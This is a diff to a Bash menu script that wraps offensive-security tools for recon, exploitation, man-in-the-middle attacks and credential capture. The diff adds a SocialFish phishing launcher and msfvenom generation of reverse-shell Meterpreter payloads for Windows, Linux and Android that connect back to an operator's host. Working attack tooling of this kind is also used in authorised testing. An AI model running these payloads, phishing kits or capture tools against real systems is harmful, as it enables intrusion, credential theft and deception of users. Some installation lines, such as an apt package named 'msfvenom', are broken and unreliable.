@@ -12,6 +12,8 @@ BURP_SUITE_PATH="/opt/BurpSuite"
 ZAP_PATH="/opt/zap"
 INSTALL_PATH="/opt/tools"
 REPORT_PATH="$OUTPUT_DIR/report"
+HONEYPOT_PATH="/opt/honeypots"
+PAYLOADS_DIR="/opt/payloads"
 
 # Function to display ASCII art and main menu
 display_menu() {
@@ -54,7 +56,13 @@ EOF
   echo "               +--------------------------------------+"
   echo "               | 8. Password Hash Capturing           |"
   echo "               +--------------------------------------+"
-  echo "               | 9. Reporting                         |"
+  echo "               | 9. Phishing                          |"
+  echo "               +--------------------------------------+"
+  echo "               | 10. Honeypots                        |"
+  echo "               +--------------------------------------+"
+  echo "               | 11. Payloads                         |"
+  echo "               +--------------------------------------+"
+  echo "               | 12. Reporting                        |"
   echo "               +--------------------------------------+"
   echo "               | 0. Exit                              |"
   echo "               +--------------------------------------+"
@@ -80,40 +88,79 @@ show_progress() {
   printf "\r"
 }
 
-# Function to update and upgrade the system
+# System Setup Functions
 update_system() {
   log_and_exec "Updating and upgrading the system..." "apt update && apt upgrade -y & show_progress"
 }
 
-# Function to install all requirements
-install_requirements() {
+install_general_tools() {
   log_and_exec "Installing general tools..." "apt install -y git curl wget vim & show_progress"
-  sleep 2
-  log_and_exec "Installing recon tools..." "apt install -y nmap masscan recon-ng amass sublist3r dnsenum whois whatweb dirsearch theharvester assetfinder maltego social-analyzer & show_progress"
-  sleep 2
-  log_and_exec "Installing theHarvester from GitHub..." "git clone https://github.com/laramies/theHarvester.git /opt/theHarvester && cd /opt/theHarvester && python3 -m pip install -r requirements/base.txt & show_progress"
-  sleep 2
-  log_and_exec "Installing enumeration tools..." "apt install -y enum4linux smbclient nbtscan ldap-utils snmp snmpwalk dnsrecon dnsenum & show_progress"
-  sleep 2
-  log_and_exec "Installing exploitation tools..." "apt install -y metasploit-framework sqlmap exploitdb afl mitmproxy ettercap-text-only & show_progress"
-  sleep 2
-  log_and_exec "Installing post-exploitation tools..." "apt install -y bloodhound mimikatz empire responder & show_progress"
-  sleep 2
+}
+
+install_recon_tools() {
+  log_and_exec "Installing recon tools..." "apt install -y nmap masscan theHarvester recon-ng amass sublist3r dnsenum whois whatweb dirsearch & show_progress"
+}
+
+install_enum_tools() {
+  log_and_exec "Installing enumeration tools..." "apt install -y enum4linux smbclient nbtscan & show_progress"
+}
+
+install_exploitation_tools() {
+  log_and_exec "Installing exploitation tools..." "apt install -y metasploit-framework sqlmap & show_progress"
+}
+
+install_post_exploitation_tools() {
+  log_and_exec "Installing post-exploitation tools..." "apt install -y bloodhound mimikatz & show_progress"
+}
+
+install_defense_tools() {
   log_and_exec "Installing defense tools..." "apt install -y ufw fail2ban & show_progress"
-  sleep 2
-  log_and_exec "Installing analytics tools..." "wget -O splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz 'https://download.splunk.com/products/splunk/releases/8.2.2/linux/splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz' && tar -xvf splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz -C /opt && /opt/splunk/bin/splunk start --accept-license && /opt/splunk/bin/splunk enable boot-start & show_progress"
-  sleep 2
-  log_and_exec "Installing network analysis tools..." "apt install -y wireshark tcpdump & show_progress"
-  sleep 2
-  log_and_exec "Installing BurpSuite..." "mkdir -p $BURP_SUITE_PATH && wget -O $BURP_SUITE_PATH/BurpSuite.jar 'https://portswigger.net/burp/releases/download?product=community&version=2021.10.1&type=jar' & show_progress"
-  sleep 2
-  log_and_exec "Installing ZAP..." "mkdir -p $ZAP_PATH && wget -O $ZAP_PATH/ZAP_2_9_0.zip 'https://github.com/zaproxy/zaproxy/releases/download/v2.9.0/ZAP_2_9_0.zip' && unzip $ZAP_PATH/ZAP_2_9_0.zip -d $ZAP_PATH & show_progress"
-  sleep 2
-  log_and_exec "Installing password cracking tools..." "apt install -y hashcat john & show_progress"
+}
+
+install_analytics_tools() {
+  log_and_exec "Installing analytics tools..." "apt install -y wget && wget -O splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz 'https://download.splunk.com/products/splunk/releases/8.2.2/linux/splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz' & show_progress"
+}
+
+setup_ufw() {
+  log_and_exec "Installing and configuring UFW..." "
+    apt install ufw -y &&
+    ufw default deny incoming &&
+    ufw default allow outgoing &&
+    ufw allow ssh &&
+    ufw allow http &&
+    ufw allow https &&
+    ufw logging on &&
+    ufw enable &
+    show_progress
+  "
+}
+
+setup_fail2ban() {
+  log_and_exec "Installing and configuring Fail2Ban..." "
+    apt install fail2ban -y &&
+    systemctl enable fail2ban &&
+    systemctl start fail2ban &
+    show_progress
+  "
+}
+
+setup_splunk() {
+  log_and_exec "Installing Splunk..." "
+    tar -xvf splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz -C /opt &&
+    /opt/splunk/bin/splunk start --accept-license &&
+    /opt/splunk/bin/splunk enable boot-start &
+    show_progress
+  "
+}
+
+# Check if a tool is installed
+check_tool_installed() {
+  command -v $1 >/dev/null 2>&1 || { echo >&2 "Error: $1 is not installed. Please install it and try again."; exit 1; }
 }
 
 # Reconnaissance Functions
 recon_nmap() {
+  install_recon_tools
   echo "[*] Enter the target IP or domain for Nmap recon:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/recon/nmap/$TARGET"
@@ -128,6 +175,7 @@ recon_nmap() {
 }
 
 recon_masscan() {
+  install_recon_tools
   echo "[*] Enter the target IP or domain for Masscan recon:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/recon/masscan/$TARGET"
@@ -142,6 +190,7 @@ recon_masscan() {
 }
 
 recon_amass() {
+  install_recon_tools
   echo "[*] Enter the target domain for Amass recon:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/recon/amass/$TARGET"
@@ -156,6 +205,8 @@ recon_amass() {
 }
 
 recon_maltego() {
+  install_recon_tools
+  check_tool_installed "maltego"
   echo "[*] Enter the target domain for Maltego recon:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/recon/maltego/$TARGET"
@@ -170,6 +221,8 @@ recon_maltego() {
 }
 
 recon_social_analyzer() {
+  install_recon_tools
+  check_tool_installed "social-analyzer"
   echo "[*] Enter the target username for Social Analyzer recon:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/recon/social_analyzer/$TARGET"
@@ -184,13 +237,14 @@ recon_social_analyzer() {
 }
 
 recon_dnsrecon() {
+  install_recon_tools
   echo "[*] Enter the target domain for DNSRecon:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/recon/dnsrecon/$TARGET"
   mkdir -p $OUTPUT_DIR
 
   log_and_exec "Starting DNSRecon for $TARGET..." "
-    dnsrecon -d $TARGET -a -r -s -t std,brt,srv -z -o $OUTPUT_DIR/dnsrecon.xml &
+    dnsrecon -d $TARGET -a -t std,brt,srv -z -x $OUTPUT_DIR/dnsrecon.xml &
     show_progress
   "
 
@@ -198,6 +252,8 @@ recon_dnsrecon() {
 }
 
 recon_dnsenum() {
+  install_recon_tools
+  check_tool_installed "dnsenum"
   echo "[*] Enter the target domain for DNSEnum:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/recon/dnsenum/$TARGET"
@@ -213,6 +269,7 @@ recon_dnsenum() {
 
 # Enumeration Functions
 enum_enum4linux() {
+  install_enum_tools
   echo "[*] Enter the target IP for enum4linux enumeration:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/enum/enum4linux/$TARGET"
@@ -227,6 +284,7 @@ enum_enum4linux() {
 }
 
 enum_smbclient() {
+  install_enum_tools
   echo "[*] Enter the target IP for smbclient enumeration:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/enum/smbclient/$TARGET"
@@ -241,6 +299,7 @@ enum_smbclient() {
 }
 
 enum_nbtscan() {
+  install_enum_tools
   echo "[*] Enter the target IP for nbtscan enumeration:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/enum/nbtscan/$TARGET"
@@ -255,6 +314,7 @@ enum_nbtscan() {
 }
 
 enum_ldapsearch() {
+  install_enum_tools
   echo "[*] Enter the target IP for LDAP enumeration:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/enum/ldapsearch/$TARGET"
@@ -269,6 +329,7 @@ enum_ldapsearch() {
 }
 
 enum_snmpwalk() {
+  install_enum_tools
   echo "[*] Enter the target IP for SNMP enumeration:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/enum/snmpwalk/$TARGET"
@@ -283,13 +344,14 @@ enum_snmpwalk() {
 }
 
 enum_dnsrecon() {
+  install_recon_tools
   echo "[*] Enter the target domain for DNSRecon enumeration:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/enum/dnsrecon/$TARGET"
   mkdir -p $OUTPUT_DIR
 
   log_and_exec "Starting DNSRecon enumeration for $TARGET..." "
-    dnsrecon -d $TARGET -a -r -s -t std,brt,srv -z -o $OUTPUT_DIR/dnsrecon.xml &
+    dnsrecon -d $TARGET -a -t std,brt,srv -z -x $OUTPUT_DIR/dnsrecon.xml &
     show_progress
   "
 
@@ -297,6 +359,8 @@ enum_dnsrecon() {
 }
 
 enum_dnsenum() {
+  install_recon_tools
+  check_tool_installed "dnsenum"
   echo "[*] Enter the target domain for DNSEnum enumeration:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/enum/dnsenum/$TARGET"
@@ -312,6 +376,7 @@ enum_dnsenum() {
 
 # Vulnerability Analysis Functions
 vuln_nikto() {
+  install_exploitation_tools
   echo "[*] Enter the target URL for Nikto vulnerability analysis:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/vuln/nikto/$TARGET"
@@ -326,6 +391,7 @@ vuln_nikto() {
 }
 
 vuln_zap() {
+  install_exploitation_tools
   echo "[*] Enter the target URL for ZAP vulnerability analysis:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/vuln/zap/$TARGET"
@@ -340,6 +406,7 @@ vuln_zap() {
 }
 
 vuln_sqlmap() {
+  install_exploitation_tools
   echo "[*] Enter the target URL for SQLMap vulnerability analysis:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/vuln/sqlmap/$TARGET"
@@ -354,6 +421,7 @@ vuln_sqlmap() {
 }
 
 vuln_openvas() {
+  install_exploitation_tools
   echo "[*] Enter the target IP or domain for OpenVAS vulnerability analysis:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/vuln/openvas/$TARGET"
@@ -368,6 +436,7 @@ vuln_openvas() {
 }
 
 vuln_nessus() {
+  install_exploitation_tools
   echo "[*] Enter the target IP or domain for Nessus vulnerability analysis:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/vuln/nessus/$TARGET"
@@ -383,6 +452,7 @@ vuln_nessus() {
 
 # Exploitation Functions
 exploit_msfconsole() {
+  install_exploitation_tools
   echo "[*] Enter the target IP for Metasploit exploitation:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/exploit/msfconsole/$TARGET"
@@ -397,6 +467,7 @@ exploit_msfconsole() {
 }
 
 exploit_sqlmap() {
+  install_exploitation_tools
   echo "[*] Enter the target URL for SQLMap exploitation:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/exploit/sqlmap/$TARGET"
@@ -411,6 +482,7 @@ exploit_sqlmap() {
 }
 
 exploit_burpsuite() {
+  install_exploitation_tools
   echo "[*] Enter the target URL for BurpSuite exploitation:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/exploit/burpsuite/$TARGET"
@@ -425,6 +497,7 @@ exploit_burpsuite() {
 }
 
 exploit_exploitdb() {
+  install_exploitation_tools
   echo "[*] Enter the search term for ExploitDB:" | tee -a $LOG_FILE
   read SEARCH_TERM
   OUTPUT_DIR="$OUTPUT_DIR/exploit/exploitdb/$SEARCH_TERM"
@@ -439,6 +512,7 @@ exploit_exploitdb() {
 }
 
 exploit_fuzzing() {
+  install_exploitation_tools
   echo "[*] Enter the target application for fuzzing:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/exploit/fuzzing/$TARGET"
@@ -454,6 +528,7 @@ exploit_fuzzing() {
 
 # Post-Exploitation Functions
 post_exploit_bloodhound() {
+  install_post_exploitation_tools
   echo "[*] Enter the target domain for Bloodhound post-exploitation:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/post-exploit/bloodhound/$TARGET"
@@ -468,6 +543,7 @@ post_exploit_bloodhound() {
 }
 
 post_exploit_mimikatz() {
+  install_post_exploitation_tools
   echo "[*] Enter the target IP for Mimikatz post-exploitation:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/post-exploit/mimikatz/$TARGET"
@@ -484,6 +560,7 @@ post_exploit_mimikatz() {
 }
 
 post_exploit_empire() {
+  install_post_exploitation_tools
   echo "[*] Enter the target IP for Empire post-exploitation:" | tee -a $LOG_FILE
   read TARGET
   OUTPUT_DIR="$OUTPUT_DIR/post-exploit/empire/$TARGET"
@@ -499,6 +576,7 @@ post_exploit_empire() {
 
 # MiTM Attack Functions
 mitm_ettercap() {
+  install_exploitation_tools
   echo "[*] Enter the network interface for Ettercap MiTM attack:" | tee -a $LOG_FILE
   read INTERFACE
   OUTPUT_DIR="$OUTPUT_DIR/mitm/ettercap"
@@ -513,6 +591,7 @@ mitm_ettercap() {
 }
 
 mitm_mitmproxy() {
+  install_exploitation_tools
   echo "[*] Enter the port for mitmproxy (default 8080):" | tee -a $LOG_FILE
   read PORT
   OUTPUT_DIR="$OUTPUT_DIR/mitm/mitmproxy"
@@ -527,6 +606,7 @@ mitm_mitmproxy() {
 }
 
 mitm_responder() {
+  install_exploitation_tools
   echo "[*] Enter the network interface for Responder:" | tee -a $LOG_FILE
   read INTERFACE
   OUTPUT_DIR="$OUTPUT_DIR/mitm/responder"
@@ -542,6 +622,7 @@ mitm_responder() {
 
 # Password Hash Capturing Functions
 hash_capture_responder() {
+  install_exploitation_tools
   echo "[*] Enter the network interface for Responder hash capturing:" | tee -a $LOG_FILE
   read INTERFACE
   OUTPUT_DIR="$OUTPUT_DIR/hash_capture/responder"
@@ -556,6 +637,7 @@ hash_capture_responder() {
 }
 
 hash_capture_ettercap() {
+  install_exploitation_tools
   echo "[*] Enter the network interface for Ettercap hash capturing:" | tee -a $LOG_FILE
   read INTERFACE
   OUTPUT_DIR="$OUTPUT_DIR/hash_capture/ettercap"
@@ -570,6 +652,7 @@ hash_capture_ettercap() {
 }
 
 hash_capture_creds() {
+  install_exploitation_tools
   echo "[*] Enter the network interface for capturing credentials with CredSniper:" | tee -a $LOG_FILE
   read INTERFACE
   OUTPUT_DIR="$OUTPUT_DIR/hash_capture/credsniper"
@@ -581,6 +664,141 @@ hash_capture_creds() {
   "
 
   echo "[*] CredSniper credentials capturing completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
+}
+
+# Phishing Functions
+phishing_socialfish() {
+  install_exploitation_tools
+  echo "[*] Starting SocialFish for phishing attack..." | tee -a $LOG_FILE
+  cd /opt/SocialFish
+  python3 SocialFish.py & show_progress
+  echo "[*] SocialFish phishing attack setup completed." | tee -a $LOG_FILE
+}
+
+# Honeypot Functions
+honeypot_cowrie() {
+  install_exploitation_tools
+  echo "[*] Starting Cowrie honeypot..." | tee -a $LOG_FILE
+  cd $HONEYPOT_PATH/cowrie
+  source cowrie-env/bin/activate
+  bin/cowrie start & show_progress
+  echo "[*] Cowrie honeypot started." | tee -a $LOG_FILE
+}
+
+deploy_honeypot() {
+  echo "[*] Choose honeypot to deploy:"
+  echo " 1. Cowrie"
+  echo " 0. Back to Main Menu"
+  read -p "Choice: " honeypot_choice
+  case $honeypot_choice in
+    1) honeypot_cowrie ;;
+    0) display_menu ;;
+    *) echo "Invalid option. Please try again." ;;
+  esac
+}
+
+# Payload Functions
+install_payload_tools() {
+  log_and_exec "Installing payload generation tools..." "apt install -y metasploit-framework msfvenom & show_progress"
+}
+
+generate_payload() {
+  install_payload_tools
+  echo "[*] Choose payload type to generate:"
+  echo " 1. Windows Meterpreter"
+  echo " 2. Linux Meterpreter"
+  echo " 3. Android Meterpreter"
+  echo " 0. Back to Payload Menu"
+  read -p "Choice: " payload_choice
+  case $payload_choice in
+    1) generate_windows_payload ;;
+    2) generate_linux_payload ;;
+    3) generate_android_payload ;;
+    0) payload_menu ;;
+    *) echo "Invalid option. Please try again." ;;
+  esac
+}
+
+generate_windows_payload() {
+  echo "[*] Enter LHOST (Local Host):"
+  read LHOST
+  echo "[*] Enter LPORT (Local Port):"
+  read LPORT
+  OUTPUT_DIR="$PAYLOADS_DIR/windows"
+  mkdir -p $OUTPUT_DIR
+
+  log_and_exec "Generating Windows Meterpreter payload..." "
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $OUTPUT_DIR/payload.exe &
+    show_progress
+  "
+
+  echo "[*] Windows Meterpreter payload generated. Saved in $OUTPUT_DIR/payload.exe." | tee -a $LOG_FILE
+}
+
+generate_linux_payload() {
+  echo "[*] Enter LHOST (Local Host):"
+  read LHOST
+  echo "[*] Enter LPORT (Local Port):"
+  read LPORT
+  OUTPUT_DIR="$PAYLOADS_DIR/linux"
+  mkdir -p $OUTPUT_DIR
+
+  log_and_exec "Generating Linux Meterpreter payload..." "
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $OUTPUT_DIR/payload.elf &
+    show_progress
+  "
+
+  echo "[*] Linux Meterpreter payload generated. Saved in $OUTPUT_DIR/payload.elf." | tee -a $LOG_FILE
+}
+
+generate_android_payload() {
+  echo "[*] Enter LHOST (Local Host):"
+  read LHOST
+  echo "[*] Enter LPORT (Local Port):"
+  read LPORT
+  OUTPUT_DIR="$PAYLOADS_DIR/android"
+  mkdir -p $OUTPUT_DIR
+
+  log_and_exec "Generating Android Meterpreter payload..." "
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_DIR/payload.apk &
+    show_progress
+  "
+
+  echo "[*] Android Meterpreter payload generated. Saved in $OUTPUT_DIR/payload.apk." | tee -a $LOG_FILE
+}
+
+search_payload_database() {
+  install_payload_tools
+  echo "[*] Enter search term for payload database:"
+  read SEARCH_TERM
+  OUTPUT_DIR="$PAYLOADS_DIR/search_results"
+  mkdir -p $OUTPUT_DIR
+
+  log_and_exec "Searching payload database for $SEARCH_TERM..." "
+    searchsploit $SEARCH_TERM > $OUTPUT_DIR/search_results.txt &
+    show_progress
+  "
+
+  echo "[*] Search results saved in $OUTPUT_DIR/search_results.txt." | tee -a $LOG_FILE
+}
+
+get_scope_payload() {
+  install_payload_tools
+  echo "[*] Enter target operating system (windows/linux/android):"
+  read TARGET_OS
+  echo "[*] Enter LHOST (Local Host):"
+  read LHOST
+  echo "[*] Enter LPORT (Local Port):"
+  read LPORT
+  OUTPUT_DIR="$PAYLOADS_DIR/scope"
+  mkdir -p $OUTPUT_DIR
+
+  case $TARGET_OS in
+    windows) generate_windows_payload ;;
+    linux) generate_linux_payload ;;
+    android) generate_android_payload ;;
+    *) echo "Invalid target operating system. Please try again." ;;
+  esac
 }
 
 # Reporting Function
@@ -612,7 +830,9 @@ generate_report() {
 # Function to handle user choice
 handle_choice() {
   case $1 in
-    1) update_system && install_requirements ;;
+    1) system_setup_menu 
+      handle_system_setup_choice $system_setup_choice
+      ;;
     2) recon_menu 
       handle_recon_choice $recon_choice 
       ;;
@@ -640,13 +860,78 @@ handle_choice() {
       hash_capture_menu 
       handle_hash_capture_choice $hash_capture_choice 
       ;;
-    9) generate_report ;;
+    9) 
+      phishing_menu
+      handle_phishing_choice $phishing_choice
+      ;;
+    10) 
+      honeypot_menu
+      handle_honeypot_choice $honeypot_choice
+      ;;
+    11) 
+      payload_menu
+      handle_payload_choice $payload_choice
+      ;;
+    12) generate_report ;;
     0) echo "Exiting..."; exit 0 ;;
     *) echo "Invalid option. Please try again." ;;
   esac
 }
 
 # Sub-menu Functions
+system_setup_menu() {
+  clear
+  echo "============================================"
+  echo "        System Setup and Updates Menu:"
+  echo "============================================"
+  echo "               +--------------------------------------+"
+  echo "               | 1. Update System                     |"
+  echo "               +--------------------------------------+"
+  echo "               | 2. Install General Tools             |"
+  echo "               +--------------------------------------+"
+  echo "               | 3. Install Recon Tools               |"
+  echo "               +--------------------------------------+"
+  echo "               | 4. Install Enumeration Tools         |"
+  echo "               +--------------------------------------+"
+  echo "               | 5. Install Exploitation Tools        |"
+  echo "               +--------------------------------------+"
+  echo "               | 6. Install Post-Exploitation Tools   |"
+  echo "               +--------------------------------------+"
+  echo "               | 7. Install Defense Tools             |"
+  echo "               +--------------------------------------+"
+  echo "               | 8. Install Analytics Tools           |"
+  echo "               +--------------------------------------+"
+  echo "               | 9. Setup UFW                         |"
+  echo "               +--------------------------------------+"
+  echo "               | 10. Setup Fail2Ban                   |"
+  echo "               +--------------------------------------+"
+  echo "               | 11. Setup Splunk                     |"
+  echo "               +--------------------------------------+"
+  echo "               | 0. Back to Main Menu                 |"
+  echo "               +--------------------------------------+"
+  echo
+  echo -n "Choose an option: "
+  read system_setup_choice
+}
+
+handle_system_setup_choice() {
+  case $1 in
+    1) update_system ;;
+    2) install_general_tools ;;
+    3) install_recon_tools ;;
+    4) install_enum_tools ;;
+    5) install_exploitation_tools ;;
+    6) install_post_exploitation_tools ;;
+    7) install_defense_tools ;;
+    8) install_analytics_tools ;;
+    9) setup_ufw ;;
+    10) setup_fail2ban ;;
+    11) setup_splunk ;;
+    0) display_menu ;;
+    *) echo "Invalid option. Please try again." ;;
+  esac
+}
+
 recon_menu() {
   clear
   echo "============================================"
@@ -881,6 +1166,81 @@ handle_hash_capture_choice() {
     1) hash_capture_responder ;;
     2) hash_capture_ettercap ;;
     3) hash_capture_creds ;;
+    0) display_menu ;;
+    *) echo "Invalid option. Please try again." ;;
+  esac
+}
+
+phishing_menu() {
+  clear
+  echo "============================================"
+  echo "        Phishing Menu:"
+  echo "============================================"
+  echo "               +--------------------------------------+"
+  echo "               | 1. SocialFish Phishing Attack        |"
+  echo "               +--------------------------------------+"
+  echo "               | 0. Back to Main Menu                 |"
+  echo "               +--------------------------------------+"
+  echo
+  echo -n "Choose an option: "
+  read phishing_choice
+}
+
+handle_phishing_choice() {
+  case $1 in
+    1) phishing_socialfish ;;
+    0) display_menu ;;
+    *) echo "Invalid option. Please try again." ;;
+  esac
+}
+
+honeypot_menu() {
+  clear
+  echo "============================================"
+  echo "        Honeypots Menu:"
+  echo "============================================"
+  echo "               +--------------------------------------+"
+  echo "               | 1. Deploy Cowrie Honeypot            |"
+  echo "               +--------------------------------------+"
+  echo "               | 0. Back to Main Menu                 |"
+  echo "               +--------------------------------------+"
+  echo
+  echo -n "Choose an option: "
+  read honeypot_choice
+}
+
+handle_honeypot_choice() {
+  case $1 in
+    1) honeypot_cowrie ;;
+    0) display_menu ;;
+    *) echo "Invalid option. Please try again." ;;
+  esac
+}
+
+payload_menu() {
+  clear
+  echo "============================================"
+  echo "        Payloads Menu:"
+  echo "============================================"
+  echo "               +--------------------------------------+"
+  echo "               | 1. Generate Payload                  |"
+  echo "               +--------------------------------------+"
+  echo "               | 2. Search Payload Database           |"
+  echo "               +--------------------------------------+"
+  echo "               | 3. Get Payload for Scope             |"
+  echo "               +--------------------------------------+"
+  echo "               | 0. Back to Main Menu                 |"
+  echo "               +--------------------------------------+"
+  echo
+  echo -n "Choose an option: "
+  read payload_choice
+}
+
+handle_payload_choice() {
+  case $1 in
+    1) generate_payload ;;
+    2) search_payload_database ;;
+    3) get_scope_payload ;;
     0) display_menu ;;
     *) echo "Invalid option. Please try again." ;;
   esac
